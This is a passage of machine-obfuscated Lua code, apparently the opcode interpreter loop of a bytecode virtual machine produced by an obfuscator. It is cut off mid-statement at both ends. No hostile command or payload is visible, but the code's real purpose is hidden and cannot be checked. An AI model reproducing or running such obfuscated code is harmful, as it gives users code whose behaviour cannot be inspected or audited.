w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 3>ba then y=f[n];else w[y[266]][y[607]]=w[y[185]];end end else if ba<=5 then if 4==ba then n=n+1;else y=f[n];end else if 7~=ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if 8==ba then y=f[n];else w[y[266]]=h[y[607]];end else if ba<11 then n=n+1;else y=f[n];end end else if ba<=13 then if ba~=13 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba<=14 then y=f[n];else if ba==15 then if(w[y[266]]~=w[y[185]])then n=n+1;else n=y[607];end;else break end end end end end ba=ba+1 end else h[y[607]]=w[y[266]];end;elseif(30>z or 30==z)then if(28>z or 28==z)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[266]]=w[y[607]][y[185]];end else if 2<ba then y=f[n];else n=n+1;end end else if ba<=5 then if 4==ba then w[y[266]]=h[y[607]];else n=n+1;end else if ba<=6 then y=f[n];else if 8>ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba~=10 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=11 then n=n+1;else if ba<13 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=15 then if 15>ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[266]else if 18~=ba then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end end ba=ba+1 end elseif not(30==z)then if not w[y[266]]then n=n+1;else n=y[607];end;else w[y[266]]=(y[607]*w[y[185]]);end;elseif(z<31 or z==31)then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then w[y[266]][y[607]]=y[185];else n=n+1;end else if ba<=2 then y=f[n];else if ba>3 then n=n+1;else w[y[266]]={};end end end else if ba<=6 then if ba==5 then y=f[n];else w[y[266]][y[607]]=w[y[185]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[266]]=h[y[607]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[266]]=w[y[607]][y[185]];else if ba>13 then y=f[n];else n=n+1;end end end else if ba<=16 then if ba<16 then w[y[266]][y[607]]=w[y[185]];else n=n+1;end else if ba<=17 then y=f[n];else if 19>ba then w[y[266]][y[607]]=w[y[185]];else break end end end end end ba=ba+1 end elseif not(33==z)then w[y[266]]=w[y[607]];else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[266]]=h[y[607]];end end end else if ba<=6 then if ba==5 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if ba<16 then bd=y[266]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[185]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif 39>=z then if 36>=z then if 34>=z then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[266]]=w[y[607]][y[185]];end else if 2<ba then y=f[n];else n=n+1;end end else if ba<=5 then if 5~=ba then w[y[266]]=h[y[607]];else n=n+1;end else if ba<=6 then y=f[n];else if 7==ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[266]]=y[607];end else if ba<=11 then n=n+1;else if ba~=13 then y=f[n];else w[y[266]]=y[607];end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[266]else if ba~=18 then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end end ba=ba+1 end elseif 35==z then local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba]()else local ba;w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=w[y[607]][w[y[185]]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](w[ba+1])end;elseif z<=37 then local ba,bb=0 while true do if ba<=8 then if(ba<=3)then if(ba<=1)then if(0<ba)then w[y[266]]=w[y[607]][y[185]];else bb=nil end else if ba>2 then y=f[n];else n=n+1;end end else if(ba<=5)then if(ba<5)then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if(ba<6 or ba==6)then y=f[n];else if not(8==ba)then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end end else if ba<=13 then if(ba==10 or ba<10)then if(ba>9)then w[y[266]]=w[y[607]][y[185]];else y=f[n];end else if ba<=11 then n=(n+1);else if not(ba~=12)then y=f[n];else w[y[266]]=false;end end end else if(ba==15 or ba<15)then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[266]else if 17<ba then break else w[bb](w[(bb+1)])end end end end end ba=(ba+1)end elseif 38<z then local ba;w[y[266]]={};n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba]()else local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](w[ba+1])end;elseif z<=42 then if 40>=z then local ba;w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];w[y[266]]=y[607];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))elseif 41==z then local ba;w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]]*y[185];n=n+1;y=f[n];w[y[266]]=w[y[607]]+w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]]+w[y[185]];n=n+1;y=f[n];ba=y[266]w[ba]=w[ba](r(w,ba+1,y[607]))else w[y[266]]=w[y[607]]%w[y[185]];end;elseif 43>=z then local ba;w[y[266]][y[607]]=w[y[185]];n=n+1;y=f[n];w[y[266]]=j[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=h[y[607]];n=n+1;y=f[n];w[y[266]]=w[y[607]][y[185]];n=n+1;y=f[n];w[y[266]]=w[y[607]];n=n+1;y=f[n];ba=y[266]w[ba](r(w,ba+1,y[607]))elseif z<45 then w[y[266]]=w[y[607]]/y[185];else w[y[266]]=w[y[607]]-y[185];end;elseif z<=68 then if(z==56 or z<56)then if(50==z or 50>z)then if(47>=z)then if(z>46)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0<ba then w[y[266]]=h[y[607]];else bb=nil end else if 2==ba then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[266]]=y[607];else n=n+1;end else if 6<ba then w[y[266]]=y[607];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if 11>ba then w[y[266]]=y[607];else n=n+1;end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[266]end else if ba<15 then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[266]]=w[y[607]][w[y[185]]];end else if 2==ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[266]]=w[y[607]];end else if ba<=6 then y=f[n];else if 7==ba then w[y[266]]=y[607];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[266]]=y[607];end else if ba<=11 then n=n+1;else if ba==12 then y=f[n];else w[y[266]]=y[607];end end end else if ba<=15 then if 15~=ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[266]else if ba~=18 then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end end ba=ba+1 end end;elseif(48>z or 48==z)then local ba,bb,bc,bd,be=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc,bd=nil end else if ba<=2 then be=nil else if ba==3 then w[y[266]]=w[y[607]];else n=n+1;end end end else if ba<=6 then if ba==5 then y=f[n];else w[y[266]]=y[607];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[266]]=y[607];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[266]]=y[607];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=17 then if ba<=15 then be=y[266]else if ba<17 then bc,bd=i(w[be](r(w,be+1,y[607])))else p=bd+be-1 end end else if ba<=18 then bb=0;else if ba>19 then break else for bd=be,p do bb=bb+1;w[bd]=bc[bb];end;end end end end end ba=ba+1 end elseif z<50 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[266]]=j[y[607]];else bb=nil end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if 6==ba then y=f[n];else w[y[266]]=h[y[607]];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if ba>10 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end end else if ba<=13 then if 12<ba then bb=y[266]else y=f[n];end else if ba>14 then break else w[bb]=w[bb](w[bb+1])end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=15 then if ba<=7 then if ba<=3 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if 3>ba then bd=nil else w[y[266]]=h[y[607]];end end else if ba<=5 then if 5~=ba then n=n+1;else y=f[n];end else if ba<7 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba<9 then y=f[n];else w[y[266]]=h[y[607]];end else if ba~=11 then n=n+1;else y=f[n];end end else if ba<=13 then if 13~=ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if 15~=ba then y=f[n];else w[y[266]]=w[y[607]][w[y[185]]];end end end end else if ba<=23 then if ba<=19 then if ba<=17 then if 17~=ba then n=n+1;else y=f[n];end else if ba<19 then w[y[266]]=h[y[607]];else n=n+1;end end else if ba<=21 then if ba==20 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if 22==ba then n=n+1;else y=f[n];end end end else if ba<=27 then if ba<=25 then if ba>24 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if ba<27 then y=f[n];else bd=y[607];end end else if ba<=29 then if ba~=29 then bc=y[185];else bb=k(w,g,bd,bc);end else if 30==ba then w[y[266]]=bb;else break end end end end end ba=ba+1 end end;elseif 53>=z then if z<=51 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[266]]=j[y[607]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if ba==4 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba==6 then y=f[n];else w[y[266]]=h[y[607]];end end end else if ba<=11 then if ba<=9 then if ba>8 then y=f[n];else n=n+1;end else if ba<11 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end else if ba<=13 then if 13~=ba then y=f[n];else bb=y[266]end else if 15>ba then w[bb]=w[bb](w[bb+1])else break end end end end ba=ba+1 end elseif(53~=z)then if w[y[266]]then n=n+1;else n=y[607];end;else for ba=y[266],y[607],1 do w[ba]=nil;end;end;elseif(54>=z)then local ba=0 while true do if(ba<6 or ba==6)then if ba<=2 then if(ba==0 or ba<0)then w[y[266]]=w[y[607]][y[185]];else if(ba>1)then y=f[n];else n=n+1;end end else if(ba==4 or ba<4)then if ba>3 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if(6~=ba)then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if(ba<=9)then if(ba<7 or ba==7)then n=(n+1);else if 8<ba then w[y[266]][y[607]]=w[y[185]];else y=f[n];end end else if(ba==11 or ba<11)then if 11>ba then n=n+1;else y=f[n];end else if(ba==12)then n=y[607];else break end end end end ba=(ba+1)end elseif z==55 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3==ba then w[y[266]]=j[y[607]];else n=n+1;end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=14 then if ba<=11 then if ba>10 then y=f[n];else n=n+1;end else if ba<=12 then w[y[266]]=w[y[607]][y[185]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[266]end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[185]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else w[y[266]]=w[y[607]]%y[185];end;elseif(62==z or 62>z)then if 59>=z then if(57>=z)then local ba=y[266]w[ba](w[ba+1])elseif not(z~=58)then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[266]]=h[y[607]];else if 2>ba then n=n+1;else y=f[n];end end else if ba<=4 then if 3==ba then w[y[266]]=h[y[607]];else n=n+1;end else if 6~=ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[266]]=w[y[607]][w[y[185]]];end end else if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba>12 then break else if(w[y[266]]~=y[185])then n=n+1;else n=y[607];end;end end end end ba=ba+1 end else local ba=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0<ba then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else w={};end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[266]]=h[y[607]];end else if ba<=6 then y=f[n];else if 8>ba then w[y[266]]=w[y[607]]+y[185];else n=n+1;end end end end else if ba<=12 then if ba<=10 then if ba==9 then y=f[n];else h[y[607]]=w[y[266]];end else if 12>ba then n=n+1;else y=f[n];end end else if ba<=14 then if ba>13 then n=n+1;else w[y[266]]=h[y[607]];end else if ba<=15 then y=f[n];else if ba~=17 then w[y[266]]();else break end end end end end ba=ba+1 end end;elseif(60>=z)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3==ba then w[y[266]]=h[y[607]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=14 then if ba<=11 then if 11>ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if 13==ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 16>ba then bd=y[266]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba>18 then break else for be=bd,y[185]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end elseif 62>z then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[266]]=w[y[607]][y[185]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if ba==4 then w[y[266]]=y[607];else n=n+1;end else if ba~=7 then y=f[n];else w[y[266]]=y[607];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if ba<11 then w[y[266]]=y[607];else n=n+1;end end else if ba<=13 then if 13~=ba then y=f[n];else bb=y[266]end else if ba>14 then break else w[bb]=w[bb](r(w,bb+1,y[607]))end end end end ba=ba+1 end else local ba=y[266]local bb,bc=i(w[ba](w[ba+1]))p=(bc+ba-1)local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;end;elseif(65==z or 65>z)then if z<=63 then w[y[266]][w[y[607]]]=w[y[185]];elseif 65>z then if(y[266]==w[y[185]]or y[266]<w[y[185]])then n=(n+1);else n=y[607];end;else local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[266]]=false;else if 1==ba then n=n+1;else y=f[n];end end else if ba<=4 then if 3<ba then n=n+1;else w[y[266]]=h[y[607]];end else if 6~=ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[266]]=w[y[607]][w[y[185]]];end end else if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba~=13 then if(w[y[266]]~=y[185])then n=n+1;else n=y[607];end;else break end end end end ba=ba+1 end end;elseif(z<=66)then do return end;elseif 68>z then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[266]]=h[y[607]];end else if 2<ba then y=f[n];else n=n+1;end end else if ba<=5 then if 4<ba then n=n+1;else w[y[266]]=y[607];end else if ba==6 then y=f[n];else w[y[266]]=y[607];end end end else if ba<=11 then if ba<=9 then if ba~=9 then n=n+1;else y=f[n];end else if ba~=11 then w[y[266]]=y[607];else n=n+1;end end else if ba<=13 then if 12==ba then y=f[n];else bb=y[266]end else if ba<15 then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba==3 then w[y[266]]=h[y[607]];else n=n+1;end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[266]end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[185]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif 80>=z then if z<=74 then if(71>z or 71==z)then if 69>=z then w[y[266]]=(w[y[607]]/y[185]);elseif 71>z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[266]]=h[y[607]];else n=n+1;end end end else if ba<=6 then if ba==5 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[266]]=w[y[607]][w[y[185]]];else if 14>ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[266]end else if ba<=17 then bb=0;else if 18<ba then break else for be=bd,y[185]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=16 then if ba<=7 then if ba<=3 then if ba<=1 then if 0<ba then w[y[266]]=w[y[607]][y[185]];else bb=nil end else if 3~=ba then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[266]]=h[y[607]];else n=n+1;end else if 7>ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if ba<11 then w[y[266]]={};else n=n+1;end end else if ba<=13 then if 13>ba then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=14 then n=n+1;else if ba==15 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end end else if ba<=24 then if ba<=20 then if ba<=18 then if 17<ba then y=f[n];else n=n+1;end else if 19<ba then n=n+1;else w[y[266]]=h[y[607]];end end else if ba<=22 then if ba>21 then w[y[266]]={};else y=f[n];end else if ba>23 then y=f[n];else n=n+1;end end end else if ba<=28 then if ba<=26 then if 26~=ba then w[y[266]]=h[y[607]];else n=n+1;end else if ba<28 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end else if ba<=30 then if ba<30 then n=n+1;else y=f[n];end else if ba<=31 then bb=y[266]else if ba==32 then w[bb]=w[bb]()else break end end end end end end ba=ba+1 end end;elseif(72==z or 72>z)then local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if ba~=2 then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if ba<5 then y=f[n];else w[y[266]]=h[y[607]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if ba~=8 then y=f[n];else w[y[266]]=j[y[607]];end end else if ba<=10 then if ba~=10 then n=n+1;else y=f[n];end else if 11==ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if ba==14 then w[y[266]]=y[607];else n=n+1;end end else if ba<=16 then y=f[n];else if ba~=18 then w[y[266]]=y[607];else n=n+1;end end end else if ba<=21 then if ba<=19 then y=f[n];else if 20<ba then n=n+1;else w[y[266]]=y[607];end end else if ba<=23 then if ba<23 then y=f[n];else bb=y[266]end else if 25>ba then w[bb]=w[bb](r(w,bb+1,y[607]))else break end end end end end ba=ba+1 end elseif 73<z then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then w[y[266]][y[607]]=y[185];else n=n+1;end else if ba<=2 then y=f[n];else if 4>ba then w[y[266]]={};else n=n+1;end end end else if ba<=6 then if ba>5 then w[y[266]][y[607]]=w[y[185]];else y=f[n];end else if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[266]]=h[y[607]];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[266]]=w[y[607]][y[185]];else if 14>ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 16~=ba then w[y[266]][y[607]]=w[y[185]];else n=n+1;end else if ba<=17 then y=f[n];else if ba==18 then w[y[266]][y[607]]=w[y[185]];else break end end end end end ba=ba+1 end else w[y[266]]=#w[y[607]];end;elseif z<=77 then if 75>=z then local ba,bb=0 while true do if ba<=79 then if ba<=39 then if ba<=19 then if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then bb=nil else w[y[266]]=h[y[607]];end else if ba<=2 then n=n+1;else if ba~=4 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=6 then if ba~=6 then n=n+1;else y=f[n];end else if ba<=7 then w[y[266]]=h[y[607]];else if 9~=ba then n=n+1;else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba<=12 then y=f[n];else if ba>13 then n=n+1;else w[y[266]][w[y[607]]]=w[y[185]];end end end else if ba<=16 then if ba~=16 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=17 then n=n+1;else if ba~=19 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end end else if ba<=29 then if ba<=24 then if ba<=21 then if 20<ba then y=f[n];else n=n+1;end else if ba<=22 then w[y[266]]=h[y[607]];else if ba>23 then y=f[n];else n=n+1;end end end else if ba<=26 then if 26>ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba<=27 then y=f[n];else if 28<ba then n=n+1;else w[y[266]][w[y[607]]]=w[y[185]];end end end end else if ba<=34 then if ba<=31 then if ba==30 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=32 then n=n+1;else if 33<ba then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end else if ba<=36 then if 36~=ba then n=n+1;else y=f[n];end else if ba<=37 then w[y[266]]=h[y[607]];else if ba~=39 then n=n+1;else y=f[n];end end end end end end else if ba<=59 then if ba<=49 then if ba<=44 then if ba<=41 then if ba>40 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if ba<=42 then y=f[n];else if ba>43 then n=n+1;else w[y[266]][w[y[607]]]=w[y[185]];end end end else if ba<=46 then if ba~=46 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=47 then n=n+1;else if 49>ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=54 then if ba<=51 then if ba==50 then n=n+1;else y=f[n];end else if ba<=52 then w[y[266]]=h[y[607]];else if ba~=54 then n=n+1;else y=f[n];end end end else if ba<=56 then if 56>ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba<=57 then y=f[n];else if ba<59 then w[y[266]][w[y[607]]]=w[y[185]];else n=n+1;end end end end end else if ba<=69 then if ba<=64 then if ba<=61 then if 60==ba then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=62 then n=n+1;else if ba~=64 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=66 then if 65<ba then y=f[n];else n=n+1;end else if ba<=67 then w[y[266]]=h[y[607]];else if 68<ba then y=f[n];else n=n+1;end end end end else if ba<=74 then if ba<=71 then if 70==ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba<=72 then y=f[n];else if ba>73 then n=n+1;else w[y[266]][w[y[607]]]=w[y[185]];end end end else if ba<=76 then if 76>ba then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=77 then n=n+1;else if 78<ba then w[y[266]]=w[y[607]][y[185]];else y=f[n];end end end end end end end else if ba<=119 then if ba<=99 then if ba<=89 then if ba<=84 then if ba<=81 then if ba<81 then n=n+1;else y=f[n];end else if ba<=82 then w[y[266]]=h[y[607]];else if ba>83 then y=f[n];else n=n+1;end end end else if ba<=86 then if 86>ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba<=87 then y=f[n];else if 89~=ba then w[y[266]][w[y[607]]]=w[y[185]];else n=n+1;end end end end else if ba<=94 then if ba<=91 then if ba==90 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=92 then n=n+1;else if 93==ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=96 then if 95<ba then y=f[n];else n=n+1;end else if ba<=97 then w[y[266]]=h[y[607]];else if ba==98 then n=n+1;else y=f[n];end end end end end else if ba<=109 then if ba<=104 then if ba<=101 then if 101~=ba then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba<=102 then y=f[n];else if 103<ba then n=n+1;else w[y[266]][w[y[607]]]=w[y[185]];end end end else if ba<=106 then if ba~=106 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=107 then n=n+1;else if ba==108 then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end else if ba<=114 then if ba<=111 then if 111~=ba then n=n+1;else y=f[n];end else if ba<=112 then w[y[266]]=h[y[607]];else if 114~=ba then n=n+1;else y=f[n];end end end else if ba<=116 then if ba==115 then w[y[266]]=w[y[607]][y[185]];else n=n+1;end else if ba<=117 then y=f[n];else if 118==ba then w[y[266]][w[y[607]]]=w[y[185]];else n=n+1;end end end end end end else if ba<=139 then if ba<=129 then if ba<=124 then if ba<=121 then if ba~=121 then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=122 then n=n+1;else if 124>ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end else if ba<=126 then if ba<126 then n=n+1;else y=f[n];end else if ba<=127 then w[y[266]]=h[y[607]];else if 128==ba then n=n+1;else y=f[n];end end end end else if ba<=134 then if ba<=131 then if ba>130 then n=n+1;else w[y[266]]=w[y[607]][y[185]];end else if ba<=132 then y=f[n];else if 134~=ba then w[y[266]][w[y[607]]]=w[y[185]];else n=n+1;end end end else if ba<=136 then if 135==ba then y=f[n];else w[y[266]]=h[y[607]];end else if ba<=137 then n=n+1;else if 139~=ba then y=f[n];else w[y[266]]=w[y[607]][y[185]];end end end end end else if ba<=149 then if ba<=144 then if ba<=141 then if ba>140 then y=f[n];else n=n+1;end else if ba<=142 then 